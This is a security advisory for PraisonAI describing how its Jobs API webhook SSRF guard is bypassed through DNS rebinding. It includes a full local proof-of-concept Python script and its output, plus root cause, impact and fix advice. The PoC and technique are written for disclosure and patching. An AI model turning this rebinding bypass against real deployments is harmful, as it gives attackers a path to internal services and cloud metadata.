# [H] PraisonAI: Jobs webhook SSRF protection bypass via DNS rebinding

## Summary
Severity: High
Advisory: GHSA-rjvw-7vvw-549v
CVE: CVE-2026-57114
CWE: CWE-367, CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-06-18
Source: https://github.com/advisories/GHSA-rjvw-7vvw-549v
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=4.5.126 <4.6.59

## Details
# Jobs webhook SSRF protection bypass via DNS rebinding

## Summary

PraisonAI's Async Jobs API validates `webhook_url` when a job request is parsed
and again when the internal `Job` object is constructed. That validation blocks
direct loopback/private targets, but it is not bound to the later network
request. When a job completes, `_send_webhook()` passes the original hostname to
`httpx.AsyncClient.post()` with no send-time validation, IP pinning, or guarded
transport.

An attacker-controlled hostname can therefore resolve to a public IP during
Pydantic validation and later resolve to loopback/private/cloud-metadata
infrastructure during webhook delivery. This bypasses the intended SSRF guard in
current supported releases.

This appears to be an incomplete fix / patch bypass for `GHSA-8frj-8q3m-xhgm`
("Server-Side Request Forgery via Unvalidated webhook_url in Jobs API"). I defer
to maintainers on whether this should be a new advisory/CVE or an amendment to
the prior advisory, but current supported releases still appear affected.

## Affected Component

Package:

```text
praisonai
```

Files:

```text
src/praisonai/praisonai/jobs/models.py
src/praisonai/praisonai/jobs/executor.py
src/praisonai/praisonai/jobs/router.py
```

Relevant code paths:

```text
JobSubmitRequest.validate_webhook_url()
Job.validate_webhook_url()
JobExecutor._send_webhook()
POST /api/v1/runs
```

## Affected Versions

Validated affected:

- `v4.5.126` (`f00763937bf7f4d091e84533692fc0576fca9b99`);
- `v4.5.128` (`b4e3a8a8`);
- `v4.6.56` (`d3c4a2af`);
- `v4.6.57` (`e90d92231853161ad931f3498da57651a9f8b528`);
- current `main` (`2f9677abb2ea68eab864ee8b6a828fd0141612e1`,
  `v4.6.57-4-g2f9677ab`).

Suggested affected range for maintainer confirmation:

```text
>= 4.5.126, <= 4.6.57
```

No patched version is known to me at submission time.

`v4.5.124` and earlier are covered by the older unvalidated-webhook advisory.
This report is scoped to patched-era releases where direct loopback/private
webhook URLs are rejected but DNS rebinding still bypasses the guard.

## Root Cause

Current validation is a time-of-check/time-of-use boundary:

1. `JobSubmitRequest.webhook_url` is validated with `urlparse()` and
   `socket.gethostbyname()`.
2. The resolved address is rejected when it is private, loopback, link-local, or
   multicast.
3. The original URL string is stored on the `Job`.
4. After job completion, `_send_webhook()` creates a fresh `httpx.AsyncClient`
   and POSTs to the original URL.
5. `httpx` resolves the hostname again. There is no revalidation of the address
   that is actually connected to.

The first DNS answer is therefore trusted for a later, independent DNS lookup.
An attacker who controls DNS for the webhook hostname can return a public
address during validation and an internal address during delivery.

## Local Reproduction

The PoV is local-only. It starts a loopback HTTP server, monkeypatches resolver
behavior in-process, and uses the real PraisonAI `Job` validator plus
`JobExecutor._send_webhook()` sender.

Run from a PraisonAI checkout:

```fish
env PYTHONPATH=src/praisonai python3 poc_jobs_webhook_dns_rebinding_ssrf.py
```

Observed output on current `main`:

```text
DIRECT_LOOPBACK_BLOCKED: {"Job": true, "JobSubmitRequest": true}
ACCEPTED_WEBHOOK_URL: http://rebind.test:<port>/hook
INTERNAL_SERVER_HIT: true
INTERNAL_REQUEST_HOST: rebind.test:<port>
INTERNAL_REQUEST_PATH: /hook
WEBHOOK_PAYLOAD_KEYS: completed_at,duration_seconds,error,job_id,result,status
WEBHOOK_PAYLOAD_STATUS: succeeded
PRAI-CAND-005 CONFIRMED: Jobs webhook validation is bypassed by DNS rebinding
```

The direct control proves that the current guard is meant to reject loopback
webhook destinations. The rebind case proves the same blocked destination class
is reached when the hostname changes between validation and delivery.

## Full Local PoV Script

```python
#!/usr/bin/env python3
"""Local PoV for PraisonAI Jobs webhook DNS-rebinding SSRF.

The PoV uses only loopback services. It models an attacker-controlled hostname
that resolves to a public IP during PraisonAI's Pydantic validation, then
resolves to loopback when the async webhook sender later opens the connection.
"""

from __future__ import annotations

import asyncio
import json
import queue
import socket
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any

from praisonai.jobs.executor import JobExecutor
from praisonai.jobs.models import Job, JobSubmitRequest


ATTACKER_HOST = "rebind.test"
PUBLIC_IP = "93.184.216.34"


class InternalHandler(BaseHTTPRequestHandler):
    def do_POST(self) -> None:  # noqa: N802
        length = int(self.headers.get("content-length", "0"))
        body = self.rfile.read(length)
        self.server.received.put(  # type: ignore[attr-defined]
            {
                "path": self.path,
                "host": self.headers.get("host"),
                "body": body.decode("utf-8", "replace"),
            }
        )
        self.send_response(204)
        self.end_headers()

    def log_message(self, *_args: Any) -> None:
        return


def assert_direct_loopback_blocked(port: int) -> None:
    blocked = {}
    direct_url = f"http://127.0.0.1:{port}/hook"
    for model in (JobSubmitRequest, Job):
        try:
            model(prompt="x", webhook_url=direct_url)
            blocked[model.__name__] = False
        except Exception:
            blocked[model.__name__] = True

    print("DIRECT_LOOPBACK_BLOCKED:", json.dumps(blocked, sort_keys=True))
    if not all(blocked.values()):
        raise SystemExit("control failed: direct loopback webhook URL was accepted")


def build_validated_job(port: int) -> Job:
    original_gethostbyname = socket.gethostbyname

    def validation_gethostbyname(host: str) -> str:
        if host == ATTACKER_HOST:
            return PUBLIC_IP
        return original_gethostbyname(host)

    socket.gethostbyname = validation_gethostbyname
    try:
        webhook_url = f"http://{ATTACKER_HOST}:{port}/hook"
        request = JobSubmitRequest(prompt="x", webhook_url=webhook_url)
        job = Job(prompt=request.prompt, webhook_url=request.webhook_url)
        job.succeed({"pov": "job result sent to webhook"})
        return job
    finally:
        socket.gethostbyname = original_gethostbyname


async def send_after_rebind(job: Job, port: int) -> None:
    original_getaddrinfo = socket.getaddrinfo

    def send_getaddrinfo(host: Any, port_arg: int, *args: Any, **kwargs: Any):
        normalized_host = host.decode() if isinstance(host, bytes) else host
        if normalized_host == ATTACKER_HOST:
            return [
                (
                    socket.AF_INET,
                    socket.SOCK_STREAM,
                    socket.IPPROTO_TCP,
                    "",
                    ("127.0.0.1", port_arg),
                )
            ]
        return original_getaddrinfo(host, port_arg, *args, **kwargs)

    socket.getaddrinfo = send_getaddrinfo
    try:
        await JobExecutor(store=None)._send_webhook(job)  # type: ignore[arg-type]
    finally:
        socket.getaddrinfo = original_getaddrinfo


def main() -> int:
    received: queue.Queue[dict[str, str]] = queue.Queue()
    server = HTTPServer(("127.0.0.1", 0), InternalHandler)
    server.received = received  # type: ignore[attr-defined]
    port = int(server.server_port)
    thread = threading.Thread(target=server.handle_request, daemon=True)
    thread.start()

    try:
        assert_direct_loopback_blocked(port)
        job = build_validated_job(port)
        print("ACCEPTED_WEBHOOK_URL:", job.webhook_url)
        asyncio.run(send_after_rebind(job, port))
    finally:
        server.server_close()

    try:
        hit = received.get_nowait()
    except queue.Empty:
        raise SystemExit("bypass failed: loopback-only webhook receiver was not hit")

    payload = json.loads(hit["body"])
    print("INTERNAL_SERVER_HIT: true")
    print("INTERNAL_REQUEST_HOST:", hit["host"])
    print("INTERNAL_REQUEST_PATH:", hit["path"])
    print("WEBHOOK_PAYLOAD_KEYS:", ",".join(sorted(payload)))
    print("WEBHOOK_PAYLOAD_STATUS:", payload.get("status"))

    if hit["host"] != f"{ATTACKER_HOST}:{port}":
        raise SystemExit("unexpected host header")
    if payload.get("status") != "succeeded":
        raise SystemExit("unexpected webhook payload")

    print("PRAI-CAND-005 CONFIRMED: Jobs webhook validation is bypassed by DNS rebinding")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Intended-Behavior Validation

PraisonAI's Async Jobs documentation describes `webhook_url` as the completion
callback URL for submitted jobs. The deploy API docs list webhooks as a key
feature and state that the async jobs API does not require authentication by
default, with authentication left to server deployment configuration.

The code also proves the intended safety boundary: both `JobSubmitRequest` and
`Job` currently reject direct `http://127.0.0.1:<port>/...` webhook URLs. The
PoV does not rely on local webhooks being intentionally allowed; it demonstrates
that a blocked local target becomes reachable after the validation-to-use DNS
transition.

## Impact

If an attacker can submit jobs to a PraisonAI Jobs API deployment and choose
`webhook_url`, they can cause the PraisonAI host to send POST requests to
loopback, private-network, or cloud metadata endpoints reachable from that host.

Practical impact includes:

- blind interaction with internal HTTP services;
- internal host/port reachability probing via timing and webhook error behavior;
- POSTing attacker-controlled job result payloads to internal APIs with weak
  request validation;
- cloud metadata interaction where metadata endpoints accept the request method
  and the deployment network permits access.

This report does not claim response-body disclosure, RCE, or live credential
theft without deployment-specific internal-service behavior. The SSRF primitive
is still security-relevant because webhook delivery crosses a network boundary
that current code explicitly tries to block.

## Severity

Suggested severity: High for network-reachable Jobs API deployments where job
submission is unauthenticated or attacker-accessible.

If maintainers model the Jobs API as loopback-only or authenticated in the
affected deployment, severity may reasonably be reduced. I kept the primary
rating aligned with the prior Jobs webhook SSRF advisory because PraisonAI's
public docs state that authentication is not required by default and the same
webhook sink remains reachable.

## Suggested Fix

- Move SSRF validation to the send path immediately before opening the outbound
  connection.
- Resolve all candidate addresses with `socket.getaddrinfo()`, not only the
  first IPv4 answer from `gethostbyname()`.
- Reject loopback, private, link-local, multicast, reserved, unspecified, and
  cloud metadata address ranges for every resolved address.
- Pin the validated address to the actual connection, or use a guarded HTTP
  transport/proxy that validates the destination after DNS resolution and before
  connect.
- Consider making Jobs API authentication mandatory by default for non-loopback
  binds, or require explicit opt-in to unauthenticated job submission.
- Add regression tests for direct loopback rejection, DNS rebind from public to
  loopback, IPv6/private AAAA records with public A records, and allowed public
  webhooks.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-rjvw-7vvw-549v
- https://github.com/MervinPraison/PraisonAI
